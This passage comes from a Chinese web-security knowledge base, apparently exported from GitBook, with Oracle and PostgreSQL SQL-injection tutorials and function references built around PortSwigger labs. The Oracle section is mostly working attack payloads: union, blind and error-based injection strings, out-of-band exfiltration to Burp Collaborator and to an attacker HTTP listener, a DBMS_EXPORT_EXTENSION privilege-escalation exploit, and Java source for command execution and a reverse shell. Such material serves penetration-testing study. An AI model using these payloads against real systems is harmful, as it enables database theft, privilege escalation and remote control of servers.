https://xz.aliyun.com/t/7897 https://blog.csdn.net/yuyecsdn/article/details/91410802 https://www.tr0y.wang/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/ Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-03 14:47:55 "},"知识库/01.WEB安全/01.SQLi/Oracle/Oracle 注入基础.html":{"url":"知识库/01.WEB安全/01.SQLi/Oracle/Oracle 注入基础.html","title":"Oracle 注入基础","keywords":"","body":"初始环境 环境 版本 服务器 Linux 数据库 Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production web https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oraclehttp://o1.lab.aqlab.cn:81/?id=1 docker https://github.com/ChaMd5Team/Pentest-tools/tree/master/Oracleinject 由于环境比较难找，这里使用burp官方提供的靶场来对三大注入方式（联合查询、盲注、报错注入）来进行讲解，练习SQL注入的同时我在本地搭建了一个Oracle的docker来配合练习Oracle的SQL语句，因为未接触过多的Oracle注入，如果大家有更好的注入方式，欢迎各位讨论 强调 与MySQL，MSSQL一样，Oracle数据库也是关系型数据库且支持标准型SQL语句，所以注入方式和其他关系型数据库一样，不过有一点特殊，这里强调一下Oracle查询数据的特性： Oracle 使用查询语句获取数据时需要跟上表名，在没有表的情况下可以使用dual，dual是Oracle的一个虚拟表，用来构成select的语法规则，且Oracle保证dual里永远只有一条记录 如： -- 在mysql，mssql，postgresql中 select 1,2; -- 都是正确的 -- 但是在Oracle中，需要带上dual表 select 1,2 from dual; 与Postgresql 一样，Oracle 的 ||是字符串连接符 在oracle中存在concat()函数（用法同Mysql concat()，但只能有两个参数），聚合所有结果的连接函数wm_concat()函数（同mysql group_concat()） Oracle 不支持堆叠查询 联合查询注入 联合查询注入，和其他关系型数据库注入方式一致，需要注入的页面有明显的回显位，其作用就是，在原来的查询条件的基础上，通过关键字 union，union all，从而拼接恶意SQL语句，union后面的select 得到的结果将拼接到前个select的结果的后面 若回显仅支持一行数据的话，让union前边正常的查询语句返回的结果为空 使用union select进行拼接时，注意前后两个select语句的返回的字段数必须相同，否则无法拼接 union,union all区别： union: 对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序 union all: 对两个结果集进行并集操作，包括重复行，不进行排序；注入流程 这里以靶场为例，在判断出存在注入点后，注入流程如下所示： ```basic 确定字段的数量 确定页面回显位 利用已知回显位查询数据 a.查询数据库基本信息 b.爆库名 c.爆表名 d.爆字段 e.查询敏感信息 ```确定字段的数量 使用order by语句，通过拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于/等于，则页面正常，若错误页面与正确页面一致，更换盲注或报错注入。 正常页面： 错误页面： 确定页面回显位 在这里知道了字段数为2，那么就要判断回显位了，使用union select '1','2' form dual将定义的数字显示在页面上，就可以判断页面的回显位了 注意： 若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，我们让前边的select查询条件返回结果为空即可 注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条select语句的方法之一 如果union前面的查询条件返回为空的情况下，也没有标记数字，这时候一般是类型出错，导致无法显示在页面，可以将数字更改未null，如下所示 查询数据 通过第3步，找到回显位置之后，首先需要探测相关环境，如下所示 探测Oracle版本 select banner from v$version; select banner from v$version where banner like 'Oracle%'; select version from v$instance; 探测操作系统版本 select banner from v$version where banner like 'TNS%' 探测当前数据库用户 select user from dual; 获取当前数据库用户权限 select privilege from session_privs; -- Oracle 实现limit 使用rownum，构造between...and... select * from (select t.* ,rownum as no from (select * from session_privs)t) where no between 1 and 10 Oracle 实现分页 获取用户所拥有权限的数据库 select distinct owner from all_tables 由于Oracle 中使用 Schema 的概念将每个用户的数据进行分离，Schema 其实类似于命名空间（Namespace)，默认情况下，Schema 的名称同用户名称相同。所以当前数据库为SYSTEM 获取当前数据库中的表 -- 所有用户的表 select distinct table_name from all_tables where owner = 'SYSTEM' -- 当前用户的表 select table_name from user_tables; -- 包括系统表 select table_name from dba_tables where owner = 'SYSTEM'; 获取当前SYSTEM数据库中表USER*表的字段 首先先查询当前SYSTEM数据库中的USER*表 select table_name from all_tables where owner='SYSTEM' and table_name like 'USER%' select column_name from all_tab_columns where table_name ='USERS_KVHXKJ' 获取值 select USERNAME_ETSGGX,PASSWORD_OEDQBQ from USERS_KVHXKJ 盲注 布尔盲注 Oracle 布尔盲注和Mysql盲注一样，通过页面对带入数据库永真/假条件返回的内容差异，从而判断是否可以进行布尔盲注。通常页面返回存在/不存在两个结果，就可以判断是否存在布尔注入了 布尔盲注流程 1. 判断注入点 2. 求解数据库 a. 判断用户/当前数据库长度 b. 依次求解用户/当前数据库长度 3. 求当前数据库表 a. 判断当前数据库表的个数 b. 猜解第一个表的长度 c. 猜解表的字符串/ascii码值 d. 依次求解，直到找到所有的表 4. 求某表的列名 a. 判断该表列名的个数 b. 猜解第一个列名的长度 c. 猜解第一个列名的字符串/ascii码值 d. 依次求解，直到该表中找到所有的列名 5. 求某表的值 a. 判断字段的个数 b. 猜解第一个字段的长度 c. 猜解第一个字段的字符串/ascii码值 d. 依次求解，直到查询完表中所有的值 布尔盲注判断注入点 and 1=1 恒真 select * from xxx_table where xxx='xxx' and 1=1--' and 1=2 恒假 利用这一特性，我们可以构造payload 通过来页面显示情况来获取数据库数据 布尔盲注常用函数 ascii() substr() decode(a,b,c,d) 当a=b 返回c，否则返回d instr(a,b) 如果b字符串存在a 中，返回b在a中存在的位置，否则返回0 布尔盲注手法 获取当前数据库的用户名 select * from xxx_table where xxx='xxx' and ascii(substr((select user from dual),1,1))=83--+ ASCII('S') = 83 依次对字符串求解，当截取到最后一位（+1）时会substr()函数会返回空字符串，这里用is null 可以判断是否为空，当is null 是第7位成立，那么字符串长度为6位 ASCII('M')=77 获取所有的数据库 前面在联合查询处说了，Oracle 使用Schema 来控制不同用户的数据，所以当前数据库为用户名SYSTEM(Oracle 对大小写敏感) 在查询所有的数据库时，不能像MySQL那样使用limit，所以在Oracle中需要使用子查询来写SQL语句，类似如下 select owner from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1 以第一个数据库为例子，首先确定库的长度 select length(owner) from (select t.* ,rownum as no from (select distinct owner from all_tables)t) where no = 1 然后配合使用ascii()，substr()函数来对字符进行依次猜解 ascii('A') = 65 依次猜解，可获取库的名称，由于没有limit，在子查询中，distinct 去重owner会消耗过多的时间，所以尽量使用手工注入，且要获取其他库的数据也没有太大的必要 获取当前数据库的表 -- 首先获取当前数据库存在多少表 select count(table_name) from all_tables where owner = 'SYSTEM' -- 接着使用子查询，一个一个求解 select table_name from (select t.table_name,rownum as no from (select table_name from all_tables where owner='SYSTEM')t) where no = 1 如猜解USERS_YFRUVP表 -- select table_name from (select t.table_name,rownum as no from (select table_name from all_tables where owner='SYSTEM' and table_name not like '%$%')t)where no = 4 中间省略... 获取某表中的字段 以USERS_YFRUVP表为例 -- 求字段个数 select count(*) from all_tab_columns where table_name = 'USERS_YFRUVP' -- 接着求解字段的长度,子查询实现limit select length(column_name) from (select t.column_name ,rownum as no from (select column_name from all_tab_columns where table_name='USERS_YFRUVP')t) where no = 1 在得知长度为15的情况下，开始猜解列名 select column_name from (select t.column_name ,rownum as no from (select column_name from all_tab_columns where table_name='USERS_YFRUVP')t) where no = 1 依次求解，猜解的列名如下： USERNAME_BNQFMG，PASSWORD_FFFBAY 针对已知的列名，再带入表中求解字段 获取某表的值 -- 在得知用户名为administrator的情况下，使用如下payload可以获取密码，若不知道用户名，且表中 -- 数据不为1，需要使用子查询来实现limit select PASSWORD_FFFBAY from USERS_YFRUVP where USERNAME_BNQFMG = 'administrator' 密码为：1ta07a6rpakca47n3iui 类似decode()，instr()函数用法 -- 该语句表示如果a==b 返回c ，否则返回d select decode(a,b,c,d) from dual; -- 该语句表示b字符串存在a 中，返回b在a中存在的位置，否则返回0 select instr(a,b) from dual; 如下图所示，看到这里构造expression就懂了吧。。。 时间盲注 常用函数/表达式 decode() 类似mysql中的if case...when...then...else...end DBMS_PIPE.RECEIVE_MESSAGE DBMS_PIPE.RECEIVE_MESSAGE 如果无法通过页面差来进行注入，这时就需要使用时间盲注，时间盲注主要通过判断页面返回内容的响应时间差异进行条件判断。 Oracle主要是使用DBMS_PIPE.RECEIVE_MESSAGE('**pipename**',timeout)函数，该函数从指定管道获取消息，pipename为varchar(128)的字符串，用以指定管道名称，在这里我们输入任意值即可。 timeout为integer的可选输入参数，用来指定等待时间。 select dbms_pipe.receive_message('o', 10) from dual; 配合使用decode函数，来构成条件语句，实现时间盲注 decode函数可以当成MYSQL中的IF函数使用，相应的表达式可以参照布尔盲注 select decode(substr((select user from dual),1,1),'S',dbms_pipe.receive_message('o', 5),2) from dual 也可以使用case...when.. then...else...end 来代替decode 依次求解数据库，表，列名，字段值 子查询/超大表构造时间盲注 时间盲注不一定要用DBMS_PIPE.RECEIVE_MESSAGE()函数，当在进行笛卡尔积，或者查询系统表，子查询大表的时候也会造成数据库查询时间很慢，比如在布尔盲注中查询当前用户权限可访问的数据库，需要一个一个表示的时候，在子查询中去重就会消耗大量时间，如下： 报错注入 报错注入靶场环境 在进行报错注入之前，首先要确定目标环境在web页面上是否有错误回显，通常使用order by 大数字，或者构造错误的sql语句来判断，介绍几种报错注入函数，其他payload也就是换子查询的SQL语句 ctxsys.drithsx.sn() select ctxsys.drithsx.sn(1,(select user from dual)) ?id=1 and ctxsys.drithsx.sn(1,(select user from dual))=1-- ?id=1 and ctxsys.drithsx.sn(1,(select banner from v$version))=1-- XMLType() select upper(xmltype(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual; -- paylaod and (select upper(xmltype(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null-- dbms_xdb_version.checkin() select dbms_xdb_version.checkin((select user from dual)) from dual --payload and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null-- dbms_xdb_version.makeversioned() select dbms_xdb_version.makeversioned((select user from dual)) from dual and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null dbms_xdb_version.uncheckout() select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual -- payload and (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null dbms_utility.sqlid_to_sqlhash() SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual and (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null ordsys.ord_dicom.getmappingxpath() select ordsys.ord_dicom.getmappingxpath((select banner from v$version where banner like 'Oracle%'),1,1) from dual utl_inaddr.*() 作用:用于取得局域网或Internet环境中的主机名和IP地址. 1、utl_inaddr.get_host_address 如果查询失败，则提示系统错误 select utl_inaddr.get_host_address((select user from dual)) from dual 2、UTL_INADDR.get_host_name 如果查询失败，则提示系统错误 select utl_inaddr.get_host_name((select user from dual)) from dual OOB 外带注入 以下都需要用户可访问网络的权限 utl_http.request() 使用此方法，用户需要有utl_http访问网络的权限 然后使用||拼接字符外带出来，可以远程启动HTTP服务，或者nc远程监听某个端口 and utl_http.request('http://172.17.0.1:8888/'||(select banner from v$version where banner like 'Oracle%'))=1 utl_inaddr.get_host_address() 使用dnslog外带数据 select utl_inaddr.get_host_address((select user from dual)||'.slhiqawh25q5ujl3kqdt0o48pzvqjf.burpcollaborator.net') from dual -- payload and (select utl_inaddr.get_host_address((select user from dual)||'.slhiqawh25q5ujl3kqdt0o48pzvqjf.burpcollaborator.net') from dual) is not null 如果像数据库版本太长，会导致出错，既然要外带，就使用substr()函数来截取字符串，每次取几个特定的字符即可,下图是选择全长度的数据库，会直接报错 这里使用substr函数进行分割，一个一个获取 SYS.DBMS_LDAP.INIT()函数 select SYS.DBMS_LDAP.INIT((select user from dual)||'.slhiqawh25q5ujl3kqdt0o48pzvqjf.burpcollaborator.net',80) from dual HTTPURITYPE() 同样需要python起一个http服务，或者nc创建监听，或者dnslog外带 select HTTPURITYPE('http://172.17.0.1:8888/'||(select user from dual)).GETCLOB() FROM DUAL and (select HTTPURITYPE('http://'||(select user from dual)||'.slhiqawh25q5ujl3kqdt0o48pzvqjf.burpcollaborator.net').GETCLOB() FROM DUAL) is not null 其他攻击方式 Oracle XXE 实际上是CVE-2014-6577，受影响的版本：11.2.0.3，11.2.0.4，12.1.0.1 和12.1.0.2 Oracle XXE 的效果和 UTL_http 的效果差不多，都是将数据传输到远端服务器上。但是，由于 extractvalue() 函数对所有数据库用户都可以使用，不存在权限的问题，所以当在低权限没有UTL_http 权限时，这个不失为一个好方法 select extractvalue(xmltype(' %remote;]>'),'/l') from dual Oracle 提权漏洞 原理是 GET_DOMAIN_INDEX_TABLES 函数的参数存在注入。而该函数的所有者是 sys，所以通过注入就可以执行任意 sql 语句。而该函数的执行权限为 public，所以只要遇到一个 Oracle 的注入点并且存在这个漏洞的，基本上都可以提升到最高权限。 select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES( '1', '1', 'DBMS _OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''your own payload'''';END;'';END;--', 'SYS', 0, '1', 0 ) from dual; 权限提升之后就可以做很多事了，因为 Oracle 可以执行 JAVA 代码，所以在提升权限后具体怎么操作，就看各自的 JAVA 水平了。 这里给出几种常见的利用方式（以下均为 your own payload 处的代码）： 命令执行 创建JAVA代码 create or replace and compile java source named \"Command\" as import java.io.*;public class Command{public static String exec(String cmd) throws Exception{String sb=\"\";BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr = new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr = inBr.readLine()) != null)sb+=lineStr+\"\\n\";inBr.close();in.close();return sb;}} 赋予代码执行权限 begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''>'''''''', ''''''''execute'''''''' );end; 创建函数 create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name ''''''''Command.exec(java.lang.String) return String''''''''; 赋予函数执行权限 grant all on cmd to public 执行命令 select sys.cmd('whoami') from dual; 反弹shell 创建java代码 create or replace and compile java source named \"shell\" as import java.io.*;import java.net.*;public class shell{public static void run() throws Exception {Socket s = new Socket(\"your own ip\", 80);Process p = Runtime.getRuntime().exec(\"cmd.exe\");new T(p.getInputStream(), s.getOutputStream()).start();new T(p.getErrorStream(), s.getOutputStream()).start();new T(s.getInputStream(), p.getOutputStream()).start();}static class T extends Thread {private InputStream i;private OutputStream u;public T(InputStream in, OutputStream out) {this.u = out;this.i = in;}public void run() {BufferedReader n = new BufferedReader(new InputStreamReader(i));BufferedWriter w = new BufferedWriter(new OutputStreamWriter(u));char f[] = new char[8192];int l;try {while ((l = n.read(f, 0, f.length)) > 0) {w.write(f, 0, l);w.flush();}} catch (IOException e) {}try {if (n != null)n.close();if (w != null)w.close();} catch (Exception e) {}}}} 赋予代码执行权限 begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.net.SocketPermission'''''''', ''''''''<>'''''''', ''''''''*'''''''' );end; 创建函数 create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; 赋予函数执行权限 grant all on reversetcp to public 执行命令 select sys.reversetcp from dual; Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-09-09 14:43:40 "},"知识库/01.WEB安全/01.SQLi/Oracle/Oracle常用符号函数语句归类.html":{"url":"知识库/01.WEB安全/01.SQLi/Oracle/Oracle常用符号函数语句归类.html","title":"Oracle常用符号函数语句归类","keywords":"","body":"常用符号 符号 释义 -- 单行注释符 /**/ 多行注释符 || 用于字符拼接 null 表示空字符串 dual 虚拟表，在进行select操作必带 常用函数 字符函数 函数 释义 ascii select ascii('a') from dual 结果97 chr select chr(97) from dual 结果'a' upper SELECT Upper ('abcde') FROM dual 结果：ABCDE lower SELECT lower('ABCDE') FROM dual 结果：abcde initcap SELECT Initcap ('AAA') FROM dual 结果：AaaSELECT Initcap ('aaa') FROM dual 结果：Aaa concat SELECT Concat ('a', 'b') FROM dual 结果：abSelect 'a' || 'b' from dual 结果：ab substr Select substr('abcde',0,3) from dual 结果：abc length Select length('abcde') from dual 结果：5 replace Select replace('abcde','a','A') from dual 结果：Abcde instr Select instr('Hello World','W') from dual 结果：8Select instr('Hello World','w') from dual 结果：0如果在第一个参数中存在第二个参数，则返回第一个遇到的匹配参数的位置，该方法区分大小写 trim select trim(' Mr Smith ') from dual 结果：Mr Smith lpad select lpad('Smith',10,'') from dual 结果：**Smith rpad select rpad('Smith',10,'') from dual 结果：Smith** 数学函数 函数 释义 round select round(412,-2) from dual; 结果：400向上取整运算，第二个参数指定了取小数点后的几位，如果是5则进一。 Mod select Mod(198,2) from dual 结果：0取模运算 ABS select abs(-2) from dual 结果： 2 Trunc select trunc(412.13,2) from dual 结果：412.13select trunc(412.53) from dual 结果：412向下取整运算，第二个参数指定了取小数点后的几位 转换函数 函数 释义 to_char select to_char(1) from dual 结果：'1' to_number select to_number('1') from dual 结果：1 to_date select to_date('2021-1-1','yyyy-MM-dd') from dual 结果：01-JAN-21 其他函数/表达式 函数 释义 NVL select nvl('string',0) from dual 结果：stringselect nvl('',0) from dual 结果：0从两个表达式返回一个非 null 值 NULLIF select nullif('abc','abc') from dual 结果：空select nullif('abc','abcd') from dual 结果：abc如果两个指定的表达式相等，则返回空值，否则返回第一个表达式 NVL2 select nvl2('a','b','c') from dual 结果：bselect nvl2('','b','c') from dual 结果：c如果第一个参数不为空，则返回第二个参数；否则，返回第三个参数 decode select decode('1','1',1,2) from dual; 结果：1第一个参数是否等于第二个参数，如果等于，则返回第三个参数，否则返回第四个参数，可用于行转列 DBMS_PIPE.RECEIVE_MESSAGE select dbms_pipe.receive_message('o',10)from dual; 结果：1时间注入函数，两个参数，从指定管道获取消息,timeout 为 integer的可选输入参数，用来指定等待时间 case...when...then..else...end select case when 1=1 then 1 else 2 end from dual 结果：1 语句归类 获取数据库版本 SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'; SELECT version FROM v$instance; 获取操作系统版本 SELECT banner FROM v$version where banner like 'TNS%' 获取当前用户权限的所有数据库 SELECT DISTINCT owner FROM all_tables; 获取当前数据库 这里需要说明一下，由于Oracle 中使用 Schema 的概念将每个用户的数据进行分离，Schema 其实类似于命名空间（Namespace），默认情况下，Schema 的名称同用户名称相同，其实在这里用这种方法去查所谓的当前数据库，但是在all_tables里其实都没有，使用SQLMAP跑出来的库也没有，所以当前数据库使用select user from dual SELECT global_name FROM global_name; SELECT name FROM v$database; SELECT instance_name FROM v$instance; SELECT SYS.DATABASE_NAME FROM DUAL; 获取用户信息 -- 当前数据库用户 SELECT user FROM dual; -- 所有数据库用户 SELECT username FROM all_users ORDER BY username; -- 当前用户权限 SELECT * FROM session_privs; -- 用户角色 SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS; 获取当前数据库中的表名 -- 以SYSTEM 为例子 -- 所有用户的表 select distinct table_name from all_tables where owner = 'SYSTEM' -- 当前用户的表，这里会有很多不需要的数据，其实不建议使用 select table_name from user_tables; -- 包括系统表，需要高权限 select table_name from dba_tables where owner = 'SYSTEM'; 获取当前数据库下某表的所有列名 select column_name from all_tab_columns where table_name ='USERS_KVHXKJ' 查询值 select USERNAME_ETSGGX,PASSWORD_OEDQBQ from USERS_KVHXKJ 子查询，分页实现limit -- 这里以获取当前用户权限所拥有的数据库 -- 以下是实现limit 1,1 select owner from (select t.owner,rownum as no from (select distinct owner from all_tables)t) where no = 1 -- 实现多个 使用between and select owner from (select t.owner,rownum as no from (select distinct owner from all_tables)t) where no between 1 and 10 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-12 10:51:36 "},"知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql.html":{"url":"知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql.html","title":"Postgresql","keywords":"","body":"简介 PostgreSQL 是一个免费的对象-关系数据库服务器(ORDBMS)，在灵活的BSD许可证下发行。 PostgreSQL 开发者把它念作 post-gress-Q-L。 PostgreSQL 的 Slogan 是 \"世界上最先进的开源关系型数据库\"。 特征 特征 描述 函数 通过函数，可以在数据库服务器端执行指令程序 索引 用户可以自定义索引方法，或使用内置的 B 树，哈希表与 GiST 索引 触发器 触发器是由SQL语句查询所触发的事件。如：一个INSERT语句可能触发一个检查数据完整性的触发器。触发器通常由INSERT或UPDATE语句触发。 多版本并发控制：PostgreSQL使用多版本并发控制（MVCC，Multiversion concurrency control）系统进行并发控制，该系统向每个用户提供了一个数据库的\"快照\"，用户在事务内所作的每个修改，对于其他的用户都不可见，直到该事务成功提交 规则 规则（RULE）允许一个查询能被重写，通常用来实现对视图（VIEW）的操作，如插入（INSERT）、更新（UPDATE）、删除（DELETE） 数据类型 包括文本、任意精度的数值数组、JSON 数据、枚举类型、XML 数据等 全文检索 通过 Tsearch2 或 OpenFTS，8.3版本中内嵌 Tsearch2。 NoSQL JSON，JSONB，XML，HStore 原生支持，至 NoSQL 数据库的外部数据包装器 数据仓库 能平滑迁移至同属 PostgreSQL 生态的 GreenPlum，DeepGreen，HAWK 等，使用 FDW 进行 ETL schema(模式) 一个PostgreSQL数据库集群包含一个或多个已命名数据库。用户和用户组在整个集群范围内是共享的，但是其它数据并不共享。任何与服务器连接的客户都只能访问那个在连接请求里声明的数据库。 注意: 集群中的用户并不一定要有访问集群内所有数据库的权限。共享用户名的意思是不能有重名用户。假定同一个集群里有两个数据库和一个joe用户，系统可以配置成只允许joe 访问其中的一个数据库。 一个数据库包含一个或多个已命名的模式，模式又包含表。模式还可以包含其它对象，包括数据类型、函数、操作符等。同一个对象名可以在不同的模式里使用而不会导致冲突；比如，schema1和myschema都可以包含一个名为mytable的表。和数据库不同，模式不是严格分离的：只要有权限，一个用户可以访问他所连接的数据库中的任意模式中的对象。 我们需要模式的原因有好多： 允许多个用户使用一个数据库而不会干扰其它用户。 把数据库对象组织成逻辑组，让它们更便于管理。 第三方的应用可以放在不同的模式中，这样它们就不会和其它对象的名字冲突。 模式类似于操作系统层次的目录，只不过模式不能嵌套。 默认的schema是public模式 --简单版目录结构 postgres --public(schema) ----table_name_1 ----table_name_2 --myschema(schema) ----table_name_1 ----table_name_2 --schema... ----table_name_1 ----table_name_2 SQL postgres=# \\help SELECT Command: SELECT Description: retrieve rows from a table or view Syntax: [ WITH [ RECURSIVE ] with_query [, ...] ] SELECT [ ALL | DISTINCT [ ON ( expression [, ...] ) ] ] [ * | expression [ [ AS ] output_name ] [, ...] ] [ FROM from_item [, ...] ] [ WHERE condition ] [ GROUP BY grouping_element [, ...] ] [ HAVING condition [, ...] ] [ WINDOW window_name AS ( window_definition ) [, ...] ] [ { UNION | INTERSECT | EXCEPT } [ ALL | DISTINCT ] select ] [ ORDER BY expression [ ASC | DESC | USING operator ] [ NULLS { FIRST | LAST } ] [, ...] ] [ LIMIT { count | ALL } ] [ OFFSET start [ ROW | ROWS ] ] [ FETCH { FIRST | NEXT } [ count ] { ROW | ROWS } ONLY ] [ FOR { UPDATE | NO KEY UPDATE | SHARE | KEY SHARE } [ OF table_name [, ...] ] [ NOWAIT | SKIP LOCKED ] [...] ] from_item 可以是以下选项之一： [ ONLY ] table_name [ * ] [ [ AS ] alias [ ( column_alias [, ...] ) ] ] 一些小tips postgresql 默认用户是postgres，密码为空，可直接连接数据库，利用CVE-2019-9193触发命令执行 postgresql 默认支持多语句查询，可以使用堆叠查询读写文件，执行命令 postgresql 快速判断的方法有：pg_sleep()函数，pg_tables，pg_database等等 postgresql 注入一般只能在同库中查询，可以跨schema，但是不能跨库查询 参考链接 https://xz.aliyun.com/t/8621 https://blog.csdn.net/m0_48520508/article/details/108509371 https://www.runoob.com/postgresql/postgresql-tutorial.html https://blog.csdn.net/wjzholmes/article/details/105651159 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-03 14:48:01 "},"知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql常用符号函数语句归类.html":{"url":"知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql常用符号函数语句归类.html","title":"Postgresql常用符号函数语句归类","keywords":"","body":"常见符号 注释符 符号 说明 -- 单行注释 x为任意字符，这里表示有一个空格 | | /**/ | 多行(内联)注释 | | || | 字符串拼接 | | ::text | 类型转换为text | 常见函数/表达式 字符串函数 函数 描述 string 丨丨 string'Post' 丨丨 'greSQL' => PostgreSQL 字串连接 bit_length(string)bit_length('jose') => 32 字串里二进制位的个数 char_length(string)char_length('jose') => 4 字串中的字符个数 convert(string using conversion_name)convert('PostgreSQL' using iso_8859_1_to_utf8) =>'PostgreSQL' 使用指定的转换名字改变编码。 lower(string) 把字串转化为小写 octet_length(string)octet_length('jose') => 4 字串中的字节数 overlay(string placing string from int [for int])overlay('Txxxxas' placing 'hom' from 2 for 4) => Thomas 替换子字串 position(substring in string)position('om' in 'Thomas') =>3 返回指定的子字串的位置 substring(string [from int] [for int]) 抽取子字串 substring(string from pattern) 抽取匹配 POSIX 正则表达式的子字串 substring(string from pattern for escape) 抽取匹配SQL正则表达式的子字串 trim([leading丨trailing 丨 both] [characters] from string) 从字串string的开头/结尾/两边/ 删除只包含characters(默认是一个空白)的最长的字串 upper(string) 把字串转化为大写。 ascii(text) 参数第一个字符的ASCII码 btrim(string text [, characters text]) 从string开头和结尾删除只包含在characters里(默认是空白)的字符的最长字串 chr(int) 给出ASCII码的字符 convert(string text, [src_encoding name,] dest_encoding name) 把字串转换为dest_encoding initcap(text) 把每个单词的第一个字母转为大写，其它的保留小写。单词是一系列字母数字组成的字符，用非字母数字分隔。 length(string text) string中字符的数目 lpad(string text, length int [, fill text]) 通过填充字符fill(默认为空白)，把string填充为长度length。 如果string已经比length长则将其截断(在右边)。 ltrim(string text [, characters text]) 从字串string的开头删除只包含characters(默认是一个空白)的最长的字串。 md5(string text) 计算给出string的MD5散列，以十六进制返回结果。 repeat(string text, number int)repeat('Pg', 4) => PgPgPgPg 重复string number次。 replace(string text, from text, to text) 把字串string里出现地所有子字串from替换成子字串to。 rpad(string text, length int [, fill text]) 通过填充字符fill(默认为空白)，把string填充为长度length。如果string已经比length长则将其截断。 rtrim(string text [, character text]) 从字串string的结尾删除只包含character(默认是个空白)的最长的字 split_part(string text, delimiter text, field int)split_part('abc~@~def~@~ghi', '~@~', 2) => def 根据delimiter分隔string返回生成的第field个子字串(1 Base)。 strpos(string, substring)strpos('high','ig') => 2 声明的子字串的位置。 substr(string, from [, count]) 抽取子字串。 to_hex(number int/bigint) 把number转换成其对应地十六进制表现形式。 translate(string text, from text, to text)translate('12345', '14', 'ax') => a23x5 把在string中包含的任何匹配from中的字符的字符转化为对应的在to中的字符。 转换函数 函数 描述 to_char(timestamp, text) 将时间戳转换为字符串 to_char(interval, text) 将时间间隔转换为字符串 to_char(int, text) 整型转换为字符串 to_char(double precision, text) 双精度转换为字符串 to_char(numeric, text) 数字转换为字符串 to_date(text, text) 字符串转换为日期 to_number(text, text) 转换字符串为数字 to_timestamp(text, text) 转换为指定的时间格式 time zone convert string to time stamp to_timestamp(double precision) 把UNIX纪元转换成时间戳 其他函数/表达式 表达式 说明 case...when(expr) then result1 else result2 end 同if 表达式 语句归类 获取数据库版本 select version() 获取当前用户 select user; 获取所有的数据库 select datname from pg_database; 获取当前数据库 select current_database(); 获取当前数据库所有schema select schemaname from pg_tables 获取当前schema的表名 select tablename from pg_tables where schemaname = 'public' -- 或者从该库的information_schema.tables获取 select table_name from information_schema.tables where table_schema='public' 获取当前表的列名 SELECT attname FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='products' AND nspname='public'; select column_name from information_schema.columns where table_name = 'products'; 获取当前表的值 select name from products Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-12 11:01:40 "},"知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql注入基础.html":{"url":"知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql注入基础.html","title":"Postgresql注入基础","keywords":"","body":" 环境 版本 服务器 Linux 数据库 PostgreSQL 11.13 (Debian 11.13-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit web https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text docker postgres:latest PostgreSQL 13.4 环境依然选择使用docker搭建postgresql，web使用burp的靶场来对三大注入方式(联合查询，盲注，报错注入)来进行讲解，在练习postgresql注入的同时，也需要本地环境，这里我使用官方提供的镜像来配合练习SQL语句，如果大家有更好的姿势，欢迎各位讨论 联合查询注入 联合查询注入，和其他关系型数据库一致，需要存在注入的页面有明显的回显位，只是改变一些语法或者sql语句；其作用就是，在原来的查询的条件的基础上，通过关键字union,union all，从而拼接恶意SQL语句，将union后面的select 得到的结果将拼接到前个select的结果的后面 若回显仅支持一行数据的话，让union前边正常的查询语句返回的结果为空 使用union select进行拼接时，注意前后两个select语句的返回的字段数必须相同，否则无法拼接 union,union all区别： union: 对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序 union all: 对两个结果集进行并集操作，包括重复行，不进行排序； 注入流程 这里以burp官方提供的靶场为例，在判断出注入点之后，注入流程如下： 1. 确定字段的数量 2. 确定页面回显位 3. 利用已知回显位查询数据 a.查询数据库基本信息 b.爆库名 c.爆表名 d.爆字段 e.查询敏感信息 确定字段数量 使用order 